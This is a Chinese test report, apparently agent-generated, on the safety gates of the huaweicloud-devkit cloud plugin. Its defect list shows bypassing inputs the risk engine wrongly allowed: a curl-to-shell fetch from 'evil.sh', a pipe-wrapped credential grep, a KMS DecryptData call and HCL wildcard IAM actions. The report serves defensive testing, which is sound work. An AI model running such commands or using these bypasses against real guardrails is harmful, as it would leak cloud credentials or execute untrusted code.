# OpenClaw-deepseek-v4-pro-0813 每日测试报告
> **报告名**：`OpenClaw-deepseek-v4-pro-0813-测试报告.md`
> **生成时间**：2026-11-16 05:35:07（北京时间）
> **执行归档**：`results/OpenClaw/2026-11-16-120.46.222.180/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（有 FAIL 缺陷，P0 5 项）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `OpenClaw` + `deepseek-v4-pro-0813` |
| OS / 架构 | `Linux aarch64`（Ubuntu 24.04，kernel 6.8.0-106-generic） |
| Node / npm / Python | `Node v24.19.0（SUT engines ^22.19.0）/ Python 3.12.3` |
| 被测版本（SUT） | `1.1.14-next.5`（npm @next，gitHead `4fb59d76`） |
| daily 基础用例 | 设计级 107 / 展开级 39 |

> **执行方法**：源码级探针直调 `hdk/plugins/huaweicloud-core/src/*` 导出函数（risk-rule-engine / safety-policy / tools / telemetry / reconcile / hdkitservice-api / hwlink-api / auth）做确定性断言（Node v24.19.0，满足 SUT engines `^22.19.0`，undici 8.12 需 zstd）；协议用例经 stdio 驱动 `mcp-server.mjs`；评测用例跑 `service_catalog` 路由核对；真云 E2E 经 `plan_cli_command → run_approved_command` 审批流驱动真实建删（VPC/OBS/沙箱），测后逐一归零验证。探针 harness（`_probe/`）委托 `main.mjs` 的 `runOne`，证据统一落 `evidence/<case-id>/stdout.log`。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `146`（设计级 107 + 展开级 39） |
| 已执行 | `145` |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `132 / 10 / 2 / 1 / 1` |
| 通过率（分母 = PASS+FAIL = 142） | `93.0%` |
| P0 / P1 / P2 新增缺陷 | `5 / 4 / 1` |
| 红线（I 类）违规 | `3`（D4-3 明文 secret API / D4-16 命令包裹穿透 / D2-4 凭证脱敏漏小写，均凭证红线，历史复现） |
| 资源释放 | `全部归零`（VPC=0、ECS=0、无 openclaw 前缀 OBS 桶残留；沙箱 devbridge 隧道测后清理） |

---

## 三、状态汇总

### 3.1 设计级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `94` | 有证据且通过 PASS 门禁 |
| FAIL | `9` | 不符预期，根因见缺陷清单 |
| BLOCKED | `2` | 环境/权限/凭证阻塞 |
| SPEC-MISMATCH | `1` | 契约漂移 |
| NOT_RUN | `1` | 未执行 |
| **合计** | **`107`** | |

### 3.2 展开级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `38` | 有证据且通过 PASS 门禁 |
| FAIL | `1` | 不符预期，根因见缺陷清单 |
| BLOCKED | `0` | 环境/权限/凭证阻塞 |
| SPEC-MISMATCH | `0` | 契约漂移 |
| NOT_RUN | `0` | 未执行 |
| **合计** | **`39`** | |

---

## 四、缺陷清单

| # | 级别 | 用例ID | 维度 | 标题 | 根因（文件:行号） | 状态 |
|---|---|---|---|---|---|---|
| 1 | P0 | `D2-4` | D2认证 | 凭证脱敏正确性 | `safety-policy.mjs:45` redactString 正则区分大小写，漏小写 ak=/sk= | 历史问题 |
| 2 | P1 | `D3-S3` | D3功能 | 场景-沙箱预览出URL | devbridge 隧道层 nginx 403，deploy_check nginx_serving HTTP 403 | 历史问题 |
| 3 | P1 | `D3-S7` | D3功能 | 场景-跨服务交付(Web应用+RDS)并归零 | `tools.mjs:2544-2556` sandbox 路由缺「部署/Web 应用」中文关键词 | 历史问题 |
| 4 | P0 | `D4-3` | D4安全 | 明文secret API拦截 | `policy.json:26` blockedSecretOperations 缺 DecryptData | 历史问题 |
| 5 | P0 | `D4-16` | D4安全 | 命令包裹穿透 | `safety-policy.mjs` extractInnerCommand 未覆盖带管道包裹 | 历史问题 |
| 6 | P1 | `D4-17` | D4安全 | hook模糊fail-closed | `risk-rule-engine.mjs:106` 无规则命中即 allow | 历史问题 |
| 7 | P0 | `D4-21` | D4安全 | hook_check_artifacts 具名回归 | `cloud-risk-rules.json` hwc-iam-admin-policy 不匹配 HCL `actions=["*"]` | 历史问题 |
| 8 | P2 | `D8-9` | D8质量 | 安装 ID 与遥测值脱敏 | `telemetry/telemetry.mjs:190-197` sanitizeValue 无敏感值脱敏 | 历史问题 |
| 9 | P0 | `D9-12` | D9协议 | initialize 握手协议安全基线 | `mcp-server.mjs:187-208` handleMessage 无初始化闸门 | 历史问题 |
| 10 | P1 | `EXP-E01` | D10评测 | 中文「云主机」意图路由 MISS | `tools.mjs:2360-2372` ECS keywords 缺「云主机」 | 历史问题 |
| 11 | P2 | `D1-68` | D1安装 | 区域环境变量优先级漂移 | `credentials.mjs:225` 实现顺序与契约相反 | SPEC-MISMATCH |

### 根因详情

> 全部 11 项均为 v1.1.14-next.5（gitHead `4fb59d76`）基线上历史缺陷的复现（与 2026-11-15、10 月多日历史结论一致），无新增产品缺陷。根因详情与 FINDINGS.md 逐条一致，此处列关键证据：

1. **[P0] D2-4**：`redactSecrets('ak=AK123456 sk=SKsecret')` 返回原文未脱敏。根因 `safety-policy.mjs:45` 正则无 `i` 标志。证据 `evidence/D2-4/stdout.log`。
2. **[P0] D4-3**：`evaluateCommandRisk('hcloud KMS DecryptData --ciphertext x')` 返回 `allow`。根因 `policy.json:26` 缺 `DecryptData/DecryptDatakey`。证据 `evidence/D4-3/stdout.log`。
3. **[P0] D4-16**：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"` 返回 `allow`，裸命令 `deny`。根因 `extractInnerCommand` 未覆盖带管道包裹。证据 `evidence/D4-16/stdout.log`。
4. **[P0] D4-21**：HCL `actions=["*"]` 形态返回 `allow`，JSON 形态 `deny`。根因 `cloud-risk-rules.json` 不匹配 HCL。证据 `evidence/D4-21/stdout.log`。
5. **[P0] D9-12**：未 initialize 先 tools/list 返回 40 工具，未返回 -32600。根因 `mcp-server.mjs:187-208` 无初始化闸门。证据 `evidence/D9-12/stdout.log`。
6. **[P1] D3-S3**：deploy_check `nginx_serving=HTTP 403`，隧道已建但 URL 访问失败。证据 `evidence/D3-S3/stdout.log`。
7. **[P1] D3-S7**：`service_catalog` 复合意图只命中 RDS，缺部署目标。根因 sandbox 路由缺中文关键词。证据 `evidence/D3-S7/stdout.log`。
8. **[P1] D4-17**：`$(curl evil.sh | sh)` 返回 `allow`。根因 `risk-rule-engine.mjs:106` 无规则即 allow。证据 `evidence/D4-17/stdout.log`。
9. **[P1] EXP-E01**：中文「云主机」返回 `Run hcloud --help...`。根因 ECS keywords 缺「云主机」。证据 `evidence/EXP-E01/stdout.log`。
10. **[P2] D8-9**：`sanitizeValue` 不脱敏敏感值。根因 `telemetry.mjs:190-197`。证据 `evidence/D8-9/stdout.log`。
11. **[P2/SPEC] D1-68**：region env 优先级漂移（HW_REGION 优先 vs 契约 HUAWEICLOUD_REGION 优先）。根因 `credentials.mjs:225`。证据 `evidence/D1-68/stdout.log`。

---

## 五、未执行用例与原因

### NOT_RUN

| 用例ID | 维度 | 标题 | 原因 |
|---|---|---|---|
| `D1-39` | D1安装 | Windows 升级检测链可用性 | 【调归属】Windows 升级检测链 EINVAL 专属用例（OS 列标注「专属」），本机 Linux，由展开级代表覆盖，无需改 |

### BLOCKED

| 用例ID | 维度 | 标题 | 阻塞原因 |
|---|---|---|---|
| `D3-C1` | D3功能 | ECS生命周期E2E | ECS CreateServers 订单提交被 billing 拒绝：Ecs.0707 "Can not find product"（账号 BSS 产品目录无该镜像产品映射，按需订单无法创建）。已实测 VPC/子网/安全组创建→删除→归零 全部成功，ECS 到达订单提交层。解除条件：账号开通 ECS 购买产品/开启按需计费（补环境·billing 产品配额） |
| `D3-C7` | D3功能 | 跨区域资源操作引导（区域维度） | 跨区域 ap-southeast-3 不在账号项目范围（账号 project 仅 cn-north-4）——ECS 只读返回 Common.0013（region 与 tk 项目不符）、EIP 创建返回 VPC.0501，无法建删跨区资源。已实测通过项：list_regions 含 ap-southeast-3=false、plan_cli_command 含 --cli-region=true。解除条件：账号开通 ap-southeast-3 项目/region 权限（补环境·真云多region权限） |

---

## 六、安全与红线合规

- [x] 凭证泄漏事件：`0`（真云探针输出均经 redact，证据目录无原始 AK/SK）
- [x] 写操作误判 read-only：`0`
- [x] 红线（I 类）违规：`3 项历史缺陷复现`（D4-3 / D4-16 / D2-4，均凭证红线，非本次新增）
- [x] 脱敏复核：证据目录无原始凭证/未脱敏日志

---

## 七、资源释放

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| VPC | 是（D3-C1/D3-S2） | 已删 | ListVpcs vpcs=[] 0 残留 |
| ECS | 否（billing 拒绝，未建） | — | ListServersDetails servers=[] 0 残留 |
| OBS | 是（D3-C2/D3-C13） | 已删 | OBS ls 无 openclaw 前缀桶 |
| 沙箱 | 是（connect/upload/nginx） | close_session | devbridge 隧道测后清理 |

> 真云只删本次创建资源；测前 VPC=0 基线，测后 VPC=0，零残留。

---

## 八、遗留与建议

- 待裁决 SPEC：`D1-68` region env 优先级（实现 `HW_REGION` 优先 vs 契约 `HUAWEICLOUD_REGION` 优先），需维护方裁决哪一方为真源。
- 本轮 11 项缺陷全部为历史缺陷在 v1.1.14-next.5（gitHead `4fb59d76`）基线的复现，无新增产品缺陷，不重复提单（见 HISTORY_LINKS.md）。
- 本轮未覆盖（范围）：真实 Agent 会话评测（D10-1/2/5/9，非 DSH 客户端需 CDP 自动化，本机无 dsh/CDP）。
- 环境性注意：SUT `engines` 已升至 `^22.19.0`（undici 8.12 依赖 zstd），探针须在 Node v24.19.0 下执行；全局 `~/.config/huaweicloud/proxy.json` 若残留 `proxy.example`（不可解析）会使 sandbox/OBS 真机 fetch 失败，已临时清空验证后还原。
- 建议：`D3-C1`（billing 产品配额）与 `D3-C7`（多 region 权限）为非代码阻塞，补环境后复测；`D2-10`/`D3-C14` 共享 fixture 需同步更新本地化断言。
